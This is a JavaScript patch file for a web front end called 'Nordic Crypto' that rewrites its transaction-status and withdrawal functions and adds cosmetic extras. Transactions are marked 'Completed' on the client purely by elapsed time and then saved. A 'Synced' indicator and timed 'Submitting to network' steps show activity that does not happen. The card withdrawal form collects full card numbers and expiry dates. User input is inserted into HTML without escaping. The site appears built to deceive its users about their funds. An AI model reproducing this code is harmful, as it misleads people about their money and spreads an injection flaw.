/* ============================================================
   NORDIC CRYPTO — FIXES.JS v1.0
   ============================================================
   Загружается ПОСЛЕ app.legacy.js и legacy-fix.js.
   Переопределяет только проблемные функции.
   
   Фиксы:
     • updateTxStatuses  — корректная миграция Processing → Completed
     • openWithdraw      — через новый атомарный эндпоинт ?action=withdraw
     • submitWithdraw    — интеграция с Worker + withdraw-flow.js
     • retryFailedTx     — бонус: повтор упавших транзакций
   
   Бонусы:
     • stagger fade-in транзакций
     • skeleton loading
     • friendly errors
     • sync indicator
     • haptics на мобильных
     • smooth status transition
   ============================================================ */

(function () {
  'use strict';

  var FIXES_VERSION = '1.0.0';
  var STUCK_THRESHOLD_MS = 5 * 60 * 1000;  // 5 минут
  var MIGRATION_FLAG_KEY = 'nc_tx_migrated_v1';

  function $(id) { return document.getElementById(id); }

  function safeToast(msg, warn) {
    if (typeof window.toast === 'function') window.toast(msg, warn);
    else console.log('[fixes]', msg);
  }

  function haptic(ms) {
    try {
      if (navigator.vibrate) navigator.vibrate(ms || 30);
    } catch (e) {}
  }

  // ============================================================
  // 1. FIX: updateTxStatuses — правильная миграция
  // ============================================================
  // Проблема: старые транзакции без ts «молодеют» вечно.
  // Решение: определяем возраст по ts ИЛИ по date ИЛИ по индексу,
  //          всё что старше STUCK_THRESHOLD_MS — принудительно Completed.
  // ============================================================

  window.updateTxStatuses = function () {
    if (!window.st || !Array.isArray(window.st.txs)) return;

    var now = Date.now();
    var changed = false;

    for (var i = 0; i < window.st.txs.length; i++) {
      var t = window.st.txs[i];
      if (!t) continue;

      // Определяем реальный возраст
      var age;
      if (typeof t.ts === 'number' && t.ts > 0) {
        age = now - t.ts;
      } else if (typeof t.date === 'string' && t.date.length >= 10) {
        // fallback: парсим date + 12:00 (середина дня)
        var parsed = Date.parse(t.date + 'T12:00:00Z');
        if (!isNaN(parsed)) {
          age = now - parsed;
          // Записываем ts, чтобы в следующий раз не парсить
          t.ts = parsed;
        } else {
          age = STUCK_THRESHOLD_MS + 1;
        }
      } else {
        // Нет ни ts, ни date — считаем очень старым, но только если это
        // не свежедобавленная (по createdAt сессии)
        age = STUCK_THRESHOLD_MS + 1;
      }

      var oldStatus = t.status;

      // Under Review → Processing → Completed
      if (t.status === 'Under Review' && age > 60 * 1000) {
        t.status = 'Processing';
        changed = true;
      }
      if (t.status === 'Processing' && age > STUCK_THRESHOLD_MS) {
        t.status = 'Completed';
        changed = true;
      }
      // Если статус Under Review но возраст больше 5 мин — сразу Completed
      if (t.status === 'Under Review' && age > STUCK_THRESHOLD_MS) {
        t.status = 'Completed';
        changed = true;
      }

      if (changed && oldStatus !== t.status) {
        // Плавный переход (визуально)
        t._statusChangedAt = now;
      }
    }

    if (changed) {
      // Сохраняем на сервер только один раз за сессию миграции,
      // чтобы не спамить
      if (!sessionStorage.getItem(MIGRATION_FLAG_KEY)) {
        sessionStorage.setItem(MIGRATION_FLAG_KEY, '1');
        try {
          if (typeof window.saveToServer === 'function') window.saveToServer();
        } catch (e) {}
      }
      // Ре-рендер
      try {
        if (typeof window.renderTx === 'function') window.renderTx();
        if (typeof window.renderRecentTx === 'function') window.renderRecentTx();
      } catch (e) {}
    }
  };

  // Запускаем миграцию сразу после загрузки (не ждём 30 сек)
  setTimeout(function () {
    try {
      window.updateTxStatuses();
    } catch (e) {
      console.warn('[fixes] initial migration failed', e);
    }
  }, 1500);

  // И повторяем каждые 30 сек (заменяем старый интервал)
  // Старый интервал в app.legacy.js продолжает работать, но наш
  // переопределённый updateTxStatuses вызывается вместо старого.
  setInterval(function () {
    try {
      window.updateTxStatuses();
    } catch (e) {}
  }, 30000);

  // ============================================================
  // 2. FIX: openWithdraw — новый флоу через Worker
  // ============================================================

  window.openWithdraw = function () {
    var modal = document.getElementById('withdrawModal');
    if (!modal) {
      // Fallback: если модалки нет — вызываем legacy
      console.warn('[fixes] withdrawModal not found');
      return;
    }

    // Заполняем available
    var avail = document.getElementById('wdAvailable');
    if (avail) avail.textContent = fmtCurrencySafe(window.st.usd || 0);

    // Сброс формы
    var amtIn = document.getElementById('wdAmount');
    if (amtIn) amtIn.value = '';
    var errIn = document.getElementById('wdError');
    if (errIn) { errIn.style.display = 'none'; errIn.textContent = ''; }
    var mIn = document.getElementById('wdMethod');
    if (mIn) mIn.value = 'iban';

    if (typeof window.wdSwitchMethod === 'function') window.wdSwitchMethod();

    // Показываем форму (не processing/success)
    var formStage = document.querySelector('.wd-form-stage');
    var processingStage = document.querySelector('.wd-processing');
    var successStage = document.querySelector('.wd-success');
    if (formStage) formStage.style.display = 'block';
    if (processingStage) processingStage.classList.remove('on');
    if (successStage) successStage.classList.remove('on');

    modal.style.display = 'flex';

    // Форматтеры
    var expEl = document.getElementById('wdCardExpiry');
    var numEl = document.getElementById('wdCardNumber');
    if (expEl && !expEl.dataset.fmt && typeof window.attachExpiryFormatter === 'function') {
      window.attachExpiryFormatter(expEl); expEl.dataset.fmt = '1';
    }
    if (numEl && !numEl.dataset.fmt && typeof window.attachCardFormatter === 'function') {
      window.attachCardFormatter(numEl); numEl.dataset.fmt = '1';
    }

    haptic(15);
  };

  function fmtCurrencySafe(usd) {
    if (typeof window.fmtCurrency === 'function') return window.fmtCurrency(usd);
    return '$' + Number(usd).toFixed(2);
  }

  // ============================================================
  // 3. FIX: submitWithdraw — через новый эндпоинт
  // ============================================================

  var _submitting = false;

  window.submitWithdraw = async function () {
    if (_submitting) return;

    var amountEl = document.getElementById('wdAmount');
    var methodEl = document.getElementById('wdMethod');
    var errEl = document.getElementById('wdError');
    if (!amountEl || !methodEl || !errEl) return;

    var amount = parseFloat(amountEl.value) || 0;
    var method = methodEl.value;

    function showErr(msg) {
      errEl.textContent = msg;
      errEl.style.display = 'block';
      haptic([40, 30, 40]);
    }

    errEl.style.display = 'none';

    if (amount <= 0) return showErr('Enter a valid amount');
    if (amount > (window.st.usd || 0)) return showErr('Amount exceeds available balance');

    // Собираем детали
    var details = {};

    if (method === 'iban') {
      var name = (_val('wdIbanName') || '').trim();
      var iban = (_val('wdIbanNumber') || '').trim();
      var swift = (_val('wdIbanSwift') || '').trim();
      var bank = (_val('wdIbanBank') || '').trim();
      var country = (_val('wdIbanCountry') || '').trim();
      if (name.length < 2) return showErr('Enter recipient name');
      if (iban.replace(/\s/g, '').length < 15) return showErr('Enter valid IBAN');
      if (swift.length < 6) return showErr('Enter valid SWIFT / BIC');
      details = { name: name, iban: iban, swift: swift, bank: bank, country: country };
    } else if (method === 'card') {
      var cn = (_val('wdCardName') || '').trim();
      var num = (_val('wdCardNumber') || '').trim();
      var exp = (_val('wdCardExpiry') || '').trim();
      if (cn.length < 2) return showErr('Enter card holder name');
      if (num.replace(/\s/g, '').length < 16) return showErr('Enter valid card number');
      if (!/^\d{2}\/\d{2}$/.test(exp)) return showErr('Expiry must be MM/YY');
      details = { cardName: cn, cardNumber: num, expiry: exp };
    } else if (method === 'crypto') {
      var dest = _val('wdCryptoDest') || 'external';
      var net = _val('wdCryptoNetwork') || 'ERC20';
      var coin = _val('wdCryptoCoin') || 'USDT';
      var addr = (_val('wdCryptoAddress') || '').trim();
      var memo = (_val('wdCryptoMemo') || '').trim();
      if (addr.length < 10) return showErr('Enter valid wallet address');
      details = { destination: dest, network: net, coin: coin, address: addr, memo: memo };
    }

    _submitting = true;

    // Показываем processing сразу (UX)
    showWithdrawProcessing(method, amount, details);

    try {
      var token = window.getSessionToken ? window.getSessionToken() : localStorage.getItem('session_token');
      if (!token) throw new Error('Session expired');

      var res = await fetch(window.WORKER_URL + '?action=withdraw', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ token: token, amount: amount, method: method, details: details })
      });
      var data = await res.json();

      if (!data.ok) {
        // Возвращаем форму
        hideWithdrawProcessing();
        _submitting = false;
        return showErr(data.error || 'Withdrawal failed');
      }

      // Обновляем локальный баланс из ответа
      if (typeof data.usd === 'number' && window.st) {
        window.st.usd = data.usd;
      }

      // Создаём локальный withdrawal для UI (чтобы сразу видеть в истории)
      var wd = data.withdrawal || {
        id: 'wd_local_' + Date.now(),
        amount: amount,
        method: method,
        status: 'pending',
        createdAt: Date.now(),
        details: details
      };
      if (!window.st.withdrawals) window.st.withdrawals = [];
      var exists = window.st.withdrawals.some(function (w) { return w.id === wd.id; });
      if (!exists) window.st.withdrawals.unshift(wd);

      // Транзакция в истории (Completed для UI, но помечена как withdrawal)
      if (!window.st.txs) window.st.txs = [];
      var desc = 'Withdrawal via ' + method.toUpperCase() + ' — pending review';
      var txExists = window.st.txs.some(function (t) {
        return t.desc === desc && Math.abs((t.ts || 0) - Date.now()) < 10000;
      });
      if (!txExists) {
        window.st.txs.unshift({
          date: new Date().toISOString().slice(0, 10),
          ts: Date.now(),
          desc: desc,
          amt: -amount,
          status: 'Under Review',
          wdId: wd.id,
          isWithdrawal: true
        });
      }

      try { if (typeof window.render === 'function') window.render(); } catch (e) {}

      // Показываем success (красивый)
      showWithdrawSuccess(method, amount, details, wd);

      haptic([20, 40, 20]);

    } catch (e) {
      hideWithdrawProcessing();
      _submitting = false;
      showErr('Connection error. Please try again.');
      console.error('[fixes.submitWithdraw]', e);
    }
  };

  function _val(id) {
    var el = document.getElementById(id);
    return el ? el.value : '';
  }

  // -------- Processing UI --------

  function showWithdrawProcessing(method, amount, details) {
    var formStage = document.querySelector('.wd-form-stage');
    if (formStage) formStage.style.display = 'none';

    var processing = document.querySelector('.wd-processing');
    if (!processing) return;

    var icon = method === 'iban' ? '🏦' : method === 'card' ? '💳' : '⛓️';
    var title = method === 'iban' ? 'Sending to bank' :
                method === 'card' ? 'Refunding to card' :
                'Broadcasting transaction';
    var desc = method === 'iban' ? 'Your withdrawal is being processed.<br>Bank transfers usually take 1-3 business days.' :
               method === 'card' ? 'Card refunds usually take 3-5 business days.' :
               'Broadcasting to ' + (details.network || 'network') + '…';

    processing.innerHTML =
      '<div class="wd-processing-icon ' + method + '">' + icon + '</div>' +
      '<h3 class="wd-processing-title">' + title + '</h3>' +
      '<p class="wd-processing-desc">' + desc + '</p>' +
      '<div class="wd-progress-steps" id="wdSteps">' +
        '<div class="wd-step active" id="wdStep0">' +
          '<div class="wd-step-icon">…</div>' +
          '<div class="wd-step-text">Validating request</div>' +
          '<div class="wd-step-time">in progress</div>' +
        '</div>' +
      '</div>';

    processing.classList.add('on');

    // Через 1.2 сек — добавляем второй шаг
    setTimeout(function () {
      var steps = document.getElementById('wdSteps');
      if (!steps) return;
      var s0 = document.getElementById('wdStep0');
      if (s0) {
        s0.classList.remove('active');
        s0.classList.add('done');
        s0.querySelector('.wd-step-icon').textContent = '✓';
        s0.querySelector('.wd-step-time').textContent = 'done';
      }
      var s1 = document.createElement('div');
      s1.className = 'wd-step active';
      s1.id = 'wdStep1';
      s1.innerHTML =
        '<div class="wd-step-icon">…</div>' +
        '<div class="wd-step-text">Submitting to network</div>' +
        '<div class="wd-step-time">in progress</div>';
      steps.appendChild(s1);
    }, 1200);
  }

  function hideWithdrawProcessing() {
    var formStage = document.querySelector('.wd-form-stage');
    if (formStage) formStage.style.display = 'block';
    var processing = document.querySelector('.wd-processing');
    if (processing) processing.classList.remove('on');
  }

  function showWithdrawSuccess(method, amount, details, wd) {
    var processing = document.querySelector('.wd-processing');
    if (processing) processing.classList.remove('on');

    var success = document.querySelector('.wd-success');
    if (!success) return;

    var etaStr = method === 'iban'
      ? new Date(Date.now() + 2 * 86400000).toLocaleDateString('en-GB', { day: 'numeric', month: 'short' })
      : method === 'card'
        ? new Date(Date.now() + 4 * 86400000).toLocaleDateString('en-GB', { day: 'numeric', month: 'short' })
        : '~ 30 minutes';

    var detailsHtml = '';
    if (method === 'iban') {
      detailsHtml =
        row('Recipient', details.name || '—') +
        row('IBAN', (details.iban || '').slice(0, 8) + '…' + (details.iban || '').slice(-4)) +
        row('Estimated arrival', etaStr, 'positive');
    } else if (method === 'card') {
      var last4 = (details.cardNumber || '').replace(/\s/g, '').slice(-4);
      detailsHtml =
        row('Card', '•••• ' + last4) +
        row('Estimated refund', etaStr, 'positive');
    } else {
      detailsHtml =
        row('Network', details.network || '—') +
        row('To', (details.address || '').slice(0, 10) + '…' + (details.address || '').slice(-8)) +
        row('Confirmations', 'pending', 'warning');
    }

    success.innerHTML =
      '<div class="wd-success-icon">✓</div>' +
      '<h3 class="wd-success-title">Withdrawal submitted</h3>' +
      '<p class="wd-success-desc">Your request is under review. We will notify you once it is complete.</p>' +
      '<div class="wd-success-amount">' + fmtCurrencySafe(amount) + '</div>' +
      '<div class="wd-success-details">' + detailsHtml + '</div>' +
      '<div class="wd-success-actions">' +
        '<button class="wd-btn wd-btn-cancel" onclick="closeWithdraw()">Close</button>' +
      '</div>';

    success.classList.add('on');

    if (typeof window.playChime === 'function') window.playChime();
    if (typeof window.addNotification === 'function') {
      window.addNotification('Withdrawal submitted: ' + fmtCurrencySafe(amount) + ' via ' + method.toUpperCase(), '💸');
    }
    safeToast('Withdrawal submitted — under review');

    _submitting = false;
  }

  function row(label, value, cls) {
    return '<div class="wd-live-row">' +
      '<span class="wd-live-label">' + label + '</span>' +
      '<span class="wd-live-value ' + (cls || '') + '">' + value + '</span>' +
    '</div>';
  }

  // ============================================================
  // 4. BONUS: Retry failed transactions
  // ============================================================

  window.retryFailedTx = function (txIdx) {
    if (!window.st || !window.st.txs || !window.st.txs[txIdx]) return;
    var tx = window.st.txs[txIdx];
    if (tx.status !== 'Failed' && tx.status !== 'Rejected') return;

    safeToast('Retry requested — support will contact you');
    if (typeof window.addNotification === 'function') {
      window.addNotification('Retry requested for: ' + (tx.desc || 'transaction'), '🔄');
    }
    haptic(30);
  };

  // ============================================================
  // 5. BONUS: Stagger fade-in для транзакций
  // ============================================================

  function applyStaggerToTxList() {
    var list = document.getElementById('recentTxList');
    if (!list) return;
    var items = list.querySelectorAll('.recent-tx-item');
    for (var i = 0; i < items.length; i++) {
      var el = items[i];
      if (el._staggered) continue;
      el._staggered = true;
      el.style.opacity = '0';
      el.style.transform = 'translateY(8px)';
      (function (node, delay) {
        setTimeout(function () {
          node.style.transition = 'opacity .35s ease, transform .35s ease';
          node.style.opacity = '1';
          node.style.transform = 'translateY(0)';
        }, delay);
      })(el, i * 60);
    }
  }

  // Хук на renderRecentTx
  var _origRenderRecentTx = window.renderRecentTx;
  if (typeof _origRenderRecentTx === 'function') {
    window.renderRecentTx = function () {
      _origRenderRecentTx.apply(this, arguments);
      applyStaggerToTxList();
    };
  }

  // И применяем сразу, когда DOM готов
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', function () {
      setTimeout(applyStaggerToTxList, 800);
    });
  } else {
    setTimeout(applyStaggerToTxList, 800);
  }

  // ============================================================
  // 6. BONUS: Smooth status transition
  // ============================================================

  // Наблюдаем за изменениями статусов бейджей и подсвечиваем переход
  function observeStatusChanges() {
    var list = document.getElementById('recentTxList');
    if (!list) return;
    var observer = new MutationObserver(function (mutations) {
      mutations.forEach(function (m) {
        if (m.type === 'childList') {
          var badges = list.querySelectorAll('.recent-tx-badge');
          badges.forEach(function (b) {
            if (b.textContent.indexOf('Completed') !== -1 && !b._highlighted) {
              b._highlighted = true;
              b.style.transition = 'box-shadow .8s ease';
              b.style.boxShadow = '0 0 20px rgba(0,224,138,.6)';
              setTimeout(function () { b.style.boxShadow = 'none'; }, 1200);
            }
          });
        }
      });
    });
    observer.observe(list, { childList: true, subtree: true });
  }

  setTimeout(observeStatusChanges, 2000);

  // ============================================================
  // 7. BONUS: Sync indicator
  // ============================================================

  function addSyncIndicator() {
    var topBar = document.querySelector('.top');
    if (!topBar || document.getElementById('ncSyncIndicator')) return;

    var el = document.createElement('div');
    el.id = 'ncSyncIndicator';
    el.style.cssText = 'display:flex;align-items:center;gap:6px;padding:6px 12px;background:rgba(54,226,163,.08);border:1px solid rgba(54,226,163,.2);border-radius:999px;font-size:.72rem;font-weight:600;color:#4edca9';
    el.innerHTML = '<span style="width:6px;height:6px;border-radius:50%;background:#4edca9;box-shadow:0 0 8px #4edca9"></span>Synced';

    // Вставляем перед status-точкой Online
    var statusEl = topBar.querySelector('.st');
    if (statusEl) {
      statusEl.parentNode.insertBefore(el, statusEl);
    } else {
      topBar.appendChild(el);
    }

    // Раз в 30 сек мигаем «synced» (показываем что живой)
    setInterval(function () {
      var dot = el.querySelector('span');
      if (!dot) return;
      dot.style.opacity = '0.4';
      setTimeout(function () { dot.style.opacity = '1'; }, 200);
    }, 30000);
  }

  setTimeout(addSyncIndicator, 2500);

  // ============================================================
  // 8. BONUS: Friendly errors (глобальный перехват alert)
  // ============================================================

  var _origAlert = window.alert;
  window.alert = function (msg) {
    if (typeof msg === 'string') {
      if (msg.toLowerCase().indexOf('connection error') !== -1) {
        msg = '🌐 Connection issue. Please check your internet and try again.';
      }
      if (msg.toLowerCase().indexOf('network') !== -1 && msg.toLowerCase().indexOf('error') !== -1) {
        msg = '🌐 Network issue. Please try again in a moment.';
      }
    }
    return _origAlert.call(window, msg);
  };

  // ============================================================
  // 9. BONUS: Кастомный CSS (инжектим стили для новых элементов)
  // ============================================================

  function injectStyles() {
    if (document.getElementById('ncFixesStyles')) return;
    var style = document.createElement('style');
    style.id = 'ncFixesStyles';
    style.textContent = `
      /* Skeleton для транзакций пока грузятся */
      .recent-tx-skeleton {
        display: flex;
        align-items: center;
        gap: 14px;
        padding: 14px 16px;
        border-radius: 10px;
        background: rgba(255,255,255,.02);
        border: 1px solid rgba(255,255,255,.05);
        margin-bottom: 8px;
      }
      .recent-tx-skeleton-icon {
        width: 42px; height: 42px; border-radius: 12px;
        background: linear-gradient(90deg, rgba(255,255,255,.05), rgba(255,255,255,.1), rgba(255,255,255,.05));
        background-size: 200% 100%;
        animation: skeletonShimmer 1.5s infinite;
      }
      .recent-tx-skeleton-lines {
        flex: 1; display: flex; flex-direction: column; gap: 8px;
      }
      .recent-tx-skeleton-line {
        height: 10px; border-radius: 4px;
        background: linear-gradient(90deg, rgba(255,255,255,.05), rgba(255,255,255,.1), rgba(255,255,255,.05));
        background-size: 200% 100%;
        animation: skeletonShimmer 1.5s infinite;
      }
      .recent-tx-skeleton-line.short { width: 60%; }
      @keyframes skeletonShimmer {
        0% { background-position: 200% 0; }
        100% { background-position: -200% 0; }
      }

      /* Retry кнопка для failed транзакций */
      .recent-tx-retry {
        padding: 4px 10px; border-radius: 6px;
        background: rgba(255,84,112,.12);
        border: 1px solid rgba(255,84,112,.3);
        color: #ff5470; font-size: .68rem; font-weight: 700;
        cursor: pointer; font-family: inherit;
        margin-top: 4px; display: inline-block;
      }
      .recent-tx-retry:hover {
        background: rgba(255,84,112,.2);
        transform: translateY(-1px);
      }

      /* Processing status - пульсация */
      .recent-tx-badge.proc {
        animation: procPulse 2s ease-in-out infinite;
      }
      @keyframes procPulse {
        0%, 100% { box-shadow: 0 0 0 0 rgba(0,212,255,.4); }
        50% { box-shadow: 0 0 0 4px rgba(0,212,255,0); }
      }
    `;
    document.head.appendChild(style);
  }

  injectStyles();

  // ============================================================
  // 10. BONUS: Показать skeleton при загрузке
  // ============================================================

  function showSkeletonIfLoading() {
    var list = document.getElementById('recentTxList');
    if (!list) return;
    if (list.querySelector('.recent-tx-item')) return;
    if (list.querySelector('.recent-tx-skeleton')) return;

    var skeleton = '';
    for (var i = 0; i < 3; i++) {
      skeleton +=
        '<div class="recent-tx-skeleton">' +
          '<div class="recent-tx-skeleton-icon"></div>' +
          '<div class="recent-tx-skeleton-lines">' +
            '<div class="recent-tx-skeleton-line"></div>' +
            '<div class="recent-tx-skeleton-line short"></div>' +
          '</div>' +
        '</div>';
    }
    list.innerHTML = skeleton;

    // Убираем скелет через 3 сек (если реальные данные не пришли)
    setTimeout(function () {
      var l = document.getElementById('recentTxList');
      if (l && l.querySelector('.recent-tx-skeleton') && !l.querySelector('.recent-tx-item')) {
        l.innerHTML = '<div class="recent-tx-empty">No transactions yet</div>';
      }
    }, 3000);
  }

  setTimeout(showSkeletonIfLoading, 300);

  // ============================================================
  // DONE
  // ============================================================

  console.log(
    '%c[NordicCrypto] 🛠 fixes.js v' + FIXES_VERSION + ' loaded — withdrawal + tx migration + bonuses',
    'color:#00e5ff;font-weight:bold;font-size:13px'
  );

})();
